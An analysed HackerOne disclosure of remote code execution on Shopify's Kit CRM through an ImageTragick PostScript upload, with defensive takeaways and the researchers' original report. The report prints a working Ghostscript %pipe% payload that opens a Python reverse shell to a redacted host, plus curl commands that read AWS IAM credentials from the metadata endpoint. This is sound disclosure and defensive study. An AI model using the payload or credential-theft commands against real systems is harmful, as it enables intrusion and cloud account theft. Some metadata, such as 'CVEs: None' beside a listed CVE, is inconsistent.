# Remote Code Execution on kitcrm via ImageTragick in Priority Product Upload

## Metadata
- **Source:** HackerOne
- **Report:** 422944 | https://hackerone.com/reports/422944
- **Submitted:** 2018-10-12
- **Reporter:** fransrosen
- **Program:** Shopify (Kit CRM)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Remote Code Execution, Arbitrary File Upload, Insufficient File Validation, ImageTragick (CVE-2016-3714)
- **CVEs:** None
- **Category:** memory-binary

## Summary
The kitcrm.com seller onboarding endpoint fails to validate uploaded image files, allowing attackers to upload PostScript files that are processed by ImageMagick/Ghostscript. By uploading a malicious PostScript payload disguised as an image and triggering processing via Facebook Messenger integration commands, attackers gain remote code execution as the deploy user with access to AWS credentials.

## Attack scenario
1. Attacker registers as a seller on kitcrm.com and navigates to the priority product image upload endpoint
2. Attacker crafts a malicious PostScript file containing a shell command payload wrapped in ImageTragick syntax, bypassing basic file type checks
3. Attacker uploads the PostScript file as a 'priority product image' which is stored without proper validation
4. Attacker connects kitcrm to Facebook Messenger and sends commands that trigger image processing/rendering
5. ImageMagick processes the malicious PostScript file, executing the embedded shell command via Ghostscript's %pipe% operator
6. Attacker receives reverse shell connection as 'deploy' user with access to AWS IAM credentials and full application filesystem

## Root cause
The application performs insufficient file type validation on uploaded images, relying only on filename extensions or basic magic bytes. When ImageMagick processes these files (likely during image resizing or optimization), it delegates PostScript handling to Ghostscript, which interprets and executes arbitrary commands via the %pipe% operator. The vulnerability is compounded by: (1) no sandboxing of image processing, (2) inadequate access controls on upload endpoints, and (3) automatic processing of user-supplied files.

## Attacker mindset
Attacker demonstrates sophisticated understanding of ImageTragick vulnerability chain, recognizing that file upload endpoints processing images through ImageMagick are high-value targets. They leverage the Facebook Messenger integration as a trigger mechanism, showing awareness of application workflows. The immediate pivot to AWS credential extraction indicates reconnaissance for lateral movement and data exfiltration.

## Defensive takeaways
- Implement strict file type validation using content inspection (magic bytes) rather than extensions; reject PostScript and vector formats entirely for image uploads
- Disable Ghostscript or remove ImageMagick's ability to process PostScript/PDF files; use dedicated image libraries that only handle raster formats
- Sandboxe image processing in isolated containers with minimal IAM permissions and network access restrictions
- Implement allowlisting of permitted image MIME types and validate file signatures against IANA registry
- Disable dangerous ImageMagick delegates and configure strict security policies (disable %pipe%, system execution, file access)
- Apply principle of least privilege to deployment credentials; rotate AWS IAM keys frequently and avoid embedding credentials in application environments
- Implement rate limiting and authentication requirements on file upload endpoints
- Monitor image processing operations for suspicious command execution or network activity
- Keep ImageMagick, Ghostscript, and all image processing libraries updated to latest patched versions

## Variant hunting
Test other file upload endpoints (profile pictures, documents, attachments) for similar validation bypass
Check if PDF uploads are allowed and processed similarly via ImageMagick
Investigate if SVG uploads bypass validation but are processed as image files
Test other integration points (Shopify webhooks, other messenger platforms) that might trigger image processing
Examine batch processing features that might apply image operations to multiple files at once
Look for SSRF opportunities through image URL fetching functionality
Check if image processing occurs asynchronously via job queues (Redis, Sidekiq) that might have separate security contexts
Test for XXE via SVG uploads or other XML-based image formats

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1434 - External Remote Services (Facebook Messenger integration as trigger)
- T1204 - User Execution (admin initiating image processing)
- T1059 - Command and Scripting Interpreter
- T1552 - Unsecured Credentials (AWS credential discovery)
- T1526 - Cloud Service Discovery (AWS metadata enumeration)

## Notes
This is a critical vulnerability demonstrating the ImageTragick class of attacks (CVE-2016-3714 family). The report shows excellent security research methodology: clear exploitation path, verification of impact, and demonstration of credential compromise. The attacker immediately validates AWS access, indicating this is a high-value target for supply chain attacks given Shopify's position. The fact this was found on a Shopify internal tool suggests the vulnerability existed in production infrastructure. The use of Facebook Messenger as a processing trigger is notable - it shows attackers understand application workflows beyond just file upload functionality.

## Full report
<details><summary>Expand</summary>

Hi,

### Background

kitcrm.com allows the administrator to upload priority product images located at:

https://kitcrm.com/seller/onboarding/1

{F359446}

{F359447}

These images are not being checked if they are real JPG/PNG/GIF. When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on `██████████:8080`:

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("█████",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops

```

Then connecting kitcrm to Facebook Messenger, and writing the following commands to kit:

{F359445}

{F359443}

{F359444}

A reverse shell will be created to my host:

```sh
Listening on [0.0.0.0] (family 0, port 8080)
Connection from [52.38.69.6] port 8080 [tcp/http-alt] accepted (family 2, sport 35486)
sh: no job control in this shell
sh-4.2$ whoami
whoami
deploy
sh-4.2$ ls
ls
app
bin
config
config.ru
db
deploy
dev.yml
doc
Gemfile
Gemfile.lock
integration
lib
log
misc
package.json
public
railgun.yml
Rakefile
README.md
script
service.yml
spec
tmp
vendor
yarn.lock
```

I can also confirm this is internally for Shopify since the README refers to an internal repo of github.com/Shopify:

```
sh-4.2$ cat README.md
cat README.md
This is the Kit CRM Repo.

## Continuous Integration

[![CircleCI](███████)

## Important resources

### Production

- datadog metrics dashboards [open](█████)
- bugsnag for exceptions [open](██████)
- papertrail for logs [open](████████)
- newrelic for some other monitoring [open](████)


## Deploying

See [Deploying Kit](█████)

## Development setup:

Please see [Dev Environment Setup](████)


## Initializers

to help us order initializers we use number prefixes. These will help us be explicit about ordering.

| Range | What it's for |
| ----- | ------------- |
| 0-9   | Configurations many things including rails would use |
| 10-19 | Rails configuration |
| 20-39 | Gem configuration |
| 40-59 | Adjusting any configured libraries |
| 60-89 | Make use of any libraries |
| 90-99 | Just need these to run but don't really care about the order |
sh-4.2$
```

I also verified I can access AWS metadata:

```sh
sh-4.2$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

██████████

sh-4.2$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/████████
                
{
  "Code" : "Success",
  "LastUpdated" : "2018-10-12T11:39:10Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "█████████",
  "SecretAccessKey" : "█████████",
  "Token" : "██████████",
  "Expiration" : "2018-10-12T18:09:12Z"
}
```

I did try to list S3-buckets, and checked the assumed-role:

```
{
    "UserId": "█████",
    "Account": "█████",
    "Arn": "arn:aws:sts::████████:█████████"
}
```

You should immediately make sure Postscript files cannot be uploaded here, or urgently update or remove Ghostscript from the imagemagick instance.

Regards,
Frans and Mathias

## Impact

#

</details>

---
*Analysed by Claude on 2026-05-11*
